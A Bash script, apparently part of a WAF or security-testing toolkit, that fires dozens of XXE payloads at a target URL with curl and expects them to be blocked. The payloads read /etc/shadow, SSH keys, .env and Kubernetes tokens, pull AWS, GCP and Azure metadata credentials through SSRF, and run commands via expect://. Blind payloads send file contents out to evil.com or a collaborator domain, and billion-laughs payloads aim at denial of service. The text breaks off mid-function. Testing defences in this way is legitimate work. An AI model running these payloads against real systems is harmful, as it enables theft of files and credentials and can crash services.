#!/bin/bash
#==============================================================================
# XXE Tester - Script especializado em testes de XXE (XML External Entity)
# Versão: 1.0.0
# Descrição: Script modular para testes de XXE usando payloads do PayloadsAllTheThings
#==============================================================================

# Importar cores e variáveis (se chamado diretamente)
if [ -z "$RED" ]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    CYAN='\033[0;36m'
    MAGENTA='\033[0;35m'
    BOLD='\033[1m'
    NC='\033[0m'
fi

# Diretório base do script
XXE_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
XXE_PAYLOADS_DIR="${XXE_SCRIPT_DIR}/PayloadsAllTheThings/XXE Injection"

#==============================================================================
# FUNÇÕES AUXILIARES
#==============================================================================

xxe_print_section() {
    local title="$1"
    local shortcut="$2"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ -n "$shortcut" ]; then
        echo -e "${BOLD}${MAGENTA}$title ${CYAN}($shortcut)${NC}"
    else
        echo -e "${BOLD}${MAGENTA}$title${NC}"
    fi
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

xxe_print_subsection() {
    echo -e "\n  ${BOLD}${BLUE}▶ $1${NC}"
}

#==============================================================================
# TESTES XXE BÁSICO - File Retrieval
#==============================================================================
test_xxe_basic() {
    xxe_print_subsection "XXE Básico - File Retrieval (25 variações)"
    
    # Classic XXE - Linux files
    test_curl "XXE: Classic /etc/passwd" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
    
    test_curl "XXE: DOCTYPE /etc/shadow" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>'
    
    test_curl "XXE: /etc/hosts" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>'
    
    test_curl "XXE: /etc/hostname" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///etc/hostname">]><root>&file;</root>'
    
    test_curl "XXE: /proc/version" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///proc/version">]><root>&file;</root>'
    
    # Windows files
    test_curl "XXE: Windows boot.ini" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>'
    
    test_curl "XXE: Windows win.ini" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'
    
    # Web application files
    test_curl "XXE: index.php" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/www/html/index.php">]><root>&file;</root>'
    
    test_curl "XXE: config.php" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/www/html/config.php">]><root>&file;</root>'
    
    test_curl "XXE: .env" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/www/html/.env">]><root>&file;</root>'
    
    # PUBLIC vs SYSTEM
    test_curl "XXE: PUBLIC entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe PUBLIC "Any TEXT" "file:///etc/passwd">]><root>&xxe;</root>'
    
    # Base64 encoded
    test_curl "XXE: Base64 data://" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>'
    
    # Different variations
    test_curl "XXE: Variation 1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo><bar>&xxe;</bar></foo>'
    
    test_curl "XXE: Variation 2" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
    
    test_curl "XXE: XML declaration" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>'
    
    # SSH keys
    test_curl "XXE: SSH private key" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///root/.ssh/id_rsa">]><root>&file;</root>'
    
    test_curl "XXE: SSH authorized_keys" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///root/.ssh/authorized_keys">]><root>&file;</root>'
    
    # Log files
    test_curl "XXE: Apache access.log" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/log/apache2/access.log">]><root>&file;</root>'
    
    test_curl "XXE: Nginx access.log" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/log/nginx/access.log">]><root>&file;</root>'
    
    # Database configs
    test_curl "XXE: MySQL my.cnf" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///etc/mysql/my.cnf">]><root>&file;</root>'
    
    # Docker
    test_curl "XXE: Docker env" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///proc/self/environ">]><root>&file;</root>'
    
    test_curl "XXE: Docker cmdline" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///proc/self/cmdline">]><root>&file;</root>'
    
    # K8s
    test_curl "XXE: K8s token" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/run/secrets/kubernetes.io/serviceaccount/token">]><root>&file;</root>'
    
    # WordPress
    test_curl "XXE: wp-config.php" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file:///var/www/html/wp-config.php">]><root>&file;</root>'
    
    # Relative paths
    test_curl "XXE: Relative ../../../" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY file SYSTEM "file://../../../etc/passwd">]><root>&file;</root>'
}

#==============================================================================
# TESTES XXE PHP WRAPPERS
#==============================================================================
test_xxe_php_wrappers() {
    xxe_print_subsection "XXE PHP Wrappers (15 variações)"
    
    # php://filter base64
    test_curl "XXE: php://filter base64" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]><contacts><contact><name>&xxe;</name></contact></contacts>'
    
    test_curl "XXE: php://filter config" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]><foo>&xxe;</foo>'
    
    # php://input
    test_curl "XXE: php://input" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://input" >]><foo>&xxe;</foo>'
    
    # Different encodings
    test_curl "XXE: ROT13 encoding" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=index.php"> ]><root>&xxe;</root>'
    
    test_curl "XXE: toupper encoding" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=string.toupper/resource=index.php"> ]><root>&xxe;</root>'
    
    # Chained filters
    test_curl "XXE: Chain base64+rot13" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13|convert.base64-encode/resource=index.php"> ]><root>&xxe;</root>'
    
    # Different resources
    test_curl "XXE: filter config.php" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php"> ]><root>&xxe;</root>'
    
    test_curl "XXE: filter .htaccess" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=.htaccess"> ]><root>&xxe;</root>'
    
    # HTTP resources
    test_curl "XXE: php://filter HTTP" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >]><foo>&xxe;</foo>'
    
    # expect:// (if enabled)
    test_curl "XXE: expect://id" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>'
    
    test_curl "XXE: expect://whoami" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://whoami" >]><foo>&xxe;</foo>'
    
    test_curl "XXE: expect://ls" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls -la" >]><foo>&xxe;</foo>'
    
    # zip:// wrapper
    test_curl "XXE: zip:// wrapper" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "zip://file.zip#shell.php" >]><foo>&xxe;</foo>'
    
    # phar:// wrapper
    test_curl "XXE: phar:// wrapper" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "phar://file.phar/shell.php" >]><foo>&xxe;</foo>'
    
    # data:// wrapper
    test_curl "XXE: data:// wrapper" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "data://text/plain,XXE_TEST" >]><foo>&xxe;</foo>'
}

#==============================================================================
# TESTES XXE XINCLUDE
#==============================================================================
test_xxe_xinclude() {
    xxe_print_subsection "XXE XInclude Attacks (10 variações)"
    
    # When you can't modify DOCTYPE
    test_curl "XXE: XInclude /etc/passwd" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
    
    test_curl "XXE: XInclude /etc/hostname" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></foo>'
    
    test_curl "XXE: XInclude Windows" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///C:/Windows/win.ini"/></foo>'
    
    test_curl "XXE: XInclude config.php" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/config.php"/></foo>'
    
    test_curl "XXE: XInclude .env" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///var/www/html/.env"/></foo>'
    
    # HTTP resources
    test_curl "XXE: XInclude HTTP" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://127.0.0.1/"/></foo>'
    
    # SSRF via XInclude
    test_curl "XXE: XInclude SSRF AWS" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/></foo>'
    
    test_curl "XXE: XInclude SSRF GCP" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="http://metadata.google.internal/computeMetadata/v1/"/></foo>'
    
    # Parse XML
    test_curl "XXE: XInclude parse=xml" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="xml" href="file:///etc/passwd"/></foo>'
    
    # With fallback
    test_curl "XXE: XInclude fallback" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"><xi:fallback>FALLBACK</xi:fallback></xi:include></foo>'
}

#==============================================================================
# TESTES XXE SSRF
#==============================================================================
test_xxe_ssrf() {
    xxe_print_subsection "XXE to SSRF (20 variações)"
    
    # Internal services
    test_curl "XXE SSRF: localhost:80" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:80" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: 127.0.0.1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: Internal service" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >]><foo>&xxe;</foo>'
    
    # Redis
    test_curl "XXE SSRF: Redis 6379" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/" >]><foo>&xxe;</foo>'
    
    # MySQL
    test_curl "XXE SSRF: MySQL 3306" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/" >]><foo>&xxe;</foo>'
    
    # Elasticsearch
    test_curl "XXE SSRF: Elasticsearch" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/" >]><foo>&xxe;</foo>'
    
    # Cloud metadata
    test_curl "XXE SSRF: AWS metadata" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: AWS credentials" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: GCP metadata" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: Azure metadata" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01" >]><foo>&xxe;</foo>'
    
    # Private networks
    test_curl "XXE SSRF: 192.168.1.1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: 10.0.0.1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1/" >]><foo>&xxe;</foo>'
    
    # Port scanning
    test_curl "XXE SSRF: Port 22" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: Port 443" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:443/" >]><foo>&xxe;</foo>'
    
    # gopher://
    test_curl "XXE SSRF: gopher Redis" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO" >]><foo>&xxe;</foo>'
    
    test_curl "XXE SSRF: gopher SMTP" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/_EHLO" >]><foo>&xxe;</foo>'
    
    # dict://
    test_curl "XXE SSRF: dict Memcached" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/stats" >]><foo>&xxe;</foo>'
    
    # FTP
    test_curl "XXE SSRF: ftp://" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://127.0.0.1/" >]><foo>&xxe;</foo>'
    
    # HTTPS
    test_curl "XXE SSRF: HTTPS internal" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://internal.service.local/" >]><foo>&xxe;</foo>'
    
    # XXE + SSRF combo
    test_curl "XXE SSRF: Combo attack" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:8080/api"><!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]><foo>&xxe;</foo>'
}

#==============================================================================
# TESTES XXE BLIND / OOB
#==============================================================================
test_xxe_blind() {
    xxe_print_subsection "XXE Blind / Out-of-Band (20 variações)"
    
    local collab_domain="burp.oastify.com"
    local evil_domain="evil.com"
    
    # Basic Blind XXE
    test_curl "XXE Blind: Basic OOB" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<?xml version=\"1.0\" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM \"http://xxe-test.${collab_domain}/x\"> %ext;]><r></r>"
    
    test_curl "XXE Blind: General entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://xxe.${collab_domain}'>]><root>&test;</root>"
    
    # Out-of-Band with DTD
    test_curl "XXE Blind: Remote  DTD" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<?xml version=\"1.0\" ?><!DOCTYPE message [<!ENTITY % ext SYSTEM \"http://${evil_domain}/ext.dtd\">%ext;]><message></message>"
    
    test_curl "XXE Blind: DTD exfil" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data SYSTEM \"http://${evil_domain}/parameterEntity_oob.dtd\"><data>&send;</data>"
    
    # PHP Filter + OOB
    test_curl "XXE Blind: PHP filter OOB" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<?xml version=\"1.0\" ?><!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY % sp SYSTEM \"http://${evil_domain}/dtd.xml\">%sp;%param1;]><r>&exfil;</r>"
    
    # DNS exfiltration
    test_curl "XXE Blind: DNS exfil 1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY callhome SYSTEM \"http://${collab_domain}/?%xxe;\">]><foo>&callhome;</foo>"
    
    test_curl "XXE Blind: DNS exfil 2" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY % xxe SYSTEM \"file:///etc/passwd\" ><!ENTITY callhome SYSTEM \"www.${evil_domain}/?%xxe;\">]><foo>&callhome;</foo>"
    
    # Error-based XXE (without OOB)
    test_curl "XXE Blind: Error local DTD" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE root [<!ENTITY % local_dtd SYSTEM "file:///abcxyz/">%local_dtd;]><root></root>'
    
    # FTP exfiltration
    test_curl "XXE Blind: FTP exfil" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://${evil_domain}/xxe.dtd\">%dtd;]><foo>&send;</foo>"
    
    # Time-based blind
    test_curl "XXE Blind: Time-based" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>'
    
    # Callback variations
    test_curl "XXE Blind: HTTP callback 1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://${evil_domain}/callback\">%xxe;]><foo></foo>"
    
    test_curl "XXE Blind: HTTP callback 2" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY test SYSTEM \"http://${collab_domain}/test\">]><foo>&test;</foo>"
    
    # HTTPS callbacks
    test_curl "XXE Blind: HTTPS callback" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"https://${collab_domain}/xxe\">]><foo>&xxe;</foo>"
    
    # Different ports
    test_curl "XXE Blind: Port 8080" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://${evil_domain}:8080/\">]><foo>&xxe;</foo>"
    
    test_curl "XXE Blind: Port 443" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://${evil_domain}:443/\">]><foo>&xxe;</foo>"
    
    # Parameter entity
    test_curl "XXE Blind: Param entity 1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://${collab_domain}\">%xxe;]><foo></foo>"
    
    test_curl "XXE Blind: Param entity 2" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % data SYSTEM \"file:///etc/hostname\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://${evil_domain}/?%data;'>\">%param1;]><foo>&exfil;</foo>"
    
    # Base64 exfil
    test_curl "XXE Blind: Base64 exfil" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://${evil_domain}/?%data;'>\">%param1;]><foo>&exfil;</foo>"
    
    # Nested entities
    test_curl "XXE Blind: Nested entities" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % a \"<!ENTITY % b SYSTEM 'http://${evil_domain}/b.dtd'>\">%a;%b;]><foo></foo>"
    
    # CDATA exfiltration
    test_curl "XXE Blind: CDATA exfil" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data "<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://${evil_domain}/combine.dtd\">%dtd;]><foo>&all;</foo>"
}

#==============================================================================
# TESTES XXE DoS
#==============================================================================
test_xxe_dos() {
    xxe_print_subsection "XXE Denial of Service (10 variações)"
    
    echo -e "${YELLOW}⚠️  WARNING: DoS tests may crash the application!${NC}"
    
    # Billion Laughs (recursive expansion)
    test_curl "XXE DoS: Billion Laughs a1" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE data [<!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">]><data>&a1;</data>'
    
    test_curl "XXE DoS: Billion Laughs a2" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE data [<!ENTITY a0 "dos" ><!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;"><!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">]><data>&a2;</data>'
    
    # Parameter Laugh
    test_curl "XXE DoS: Parameter Laugh" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE r [<!ENTITY % pe_1 "<!---->"><!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;"><!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;"><!ENTITY % pe_4 "&#37;pe_3;<!---->&#37;pe_3;">%pe_4;]><r/>'
    
    # Huge file read
    test_curl "XXE DoS: /dev/random" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xxe;</foo>'
    
    test_curl "XXE DoS: /dev/urandom" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/urandom">]><foo>&xxe;</foo>'
    
    # Infinite loop
    test_curl "XXE DoS: Infinite loop" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
        --data '<!DOCTYPE foo [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><foo>&lol2;</foo>'
    
    # External DTD loop
    test_curl "XXE DoS: External DTD loop" "block" -A "$UA" -Lk -H "Content-Type: application/xml" "${URL}" \
